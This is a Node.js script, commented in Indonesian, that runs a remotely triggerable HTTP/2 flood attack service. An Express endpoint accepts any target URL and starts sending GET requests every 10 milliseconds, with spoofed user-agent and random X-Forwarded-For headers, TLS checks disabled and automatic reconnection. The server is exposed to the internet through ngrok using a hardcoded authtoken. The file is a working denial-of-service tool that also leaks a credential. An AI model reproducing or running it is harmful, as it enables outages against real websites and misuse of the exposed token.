require('colors');
const express = require('express');
const ngrok = require('ngrok');
const http2 = require('http2');
const crypto = require('crypto');

let SERVER_PORT = 3000;
let ATTACKS = new Map();

// Auto cari port yang available
const startServer = async (port) => {
  const app = express();
  
  app.use(express.json());
  
  // Endpoint sederhana
  app.post('/attack', (req, res) => {
    const { target } = req.body;
    const attackId = crypto.randomBytes(8).toString('hex');
    
    ATTACKS.set(attackId, { target, start: Date.now() });
    floodAttack(target); // Panggil fungsi serangan
    
    res.json({ 
      status: 'MULAI SERANGAN', 
      attackId,
      port: SERVER_PORT
    });
  });

  // Coba start server
  try {
    const server = await app.listen(port);
    console.log(`[+] SERVER RUNNING ON PORT ${port}`.green);
    return server;
  } catch (err) {
    if (err.code === 'EADDRINUSE') {
      console.log(`[-] PORT ${port} TIDAK AVAILABLE, COBA PORT ${port + 1}...`.yellow);
      return startServer(port + 1); // Auto ganti port
    }
    throw err;
  }
};

// Fungsi serangan super simple
const floodAttack = (target) => {
  const client = http2.connect(target, { 
    rejectUnauthorized: false,
    maxSessionMemory: 1000
  });
  
  const sendRequest = () => {
    try {
      const req = client.request({
        ':method': 'GET',
        ':path': '/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-forwarded-for': crypto.randomBytes(4).join('.')
      });
      
      req.on('response', () => req.end());
      req.on('error', () => {});
      req.end();
    } catch (err) {
      client.destroy();
      setTimeout(() => floodAttack(target), 1000); // Auto reconnect
    }
  };
  
  setInterval(sendRequest, 10); // 100 request/detik
};

// Main program
(async () => {
  try {
    const server = await startServer(SERVER_PORT);
    
    // Ngrok setup
    const url = await ngrok.connect({
      proto: 'http',
      addr: SERVER_PORT,
      authtoken: '2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa',
      region: 'ap'
    });
    
    console.log(`
    ${'╔════════════════════════╗'.cyan}
    ${'║'.cyan}  SERVER READY TO FIRE  ${'║'.cyan}
    ${'╠════════════════════════╣'.cyan}
    ${'║'.cyan} URL: ${url.padEnd(19)} ${'║'.cyan}
    ${'║'.cyan} PORT: ${SERVER_PORT.toString().padEnd(18)} ${'║'.cyan}
    ${'╚════════════════════════╝'.cyan}
    `);

    // Handle shutdown
    process.on('SIGINT', async () => {
      console.log('\nSHUTTING DOWN...'.yellow);
      await ngrok.kill();
      server.close();
      process.exit();
    });
    
  } catch (err) {
    console.log('[!] ERROR:'.red, err.message);
    process.exit(1);
  }
})();
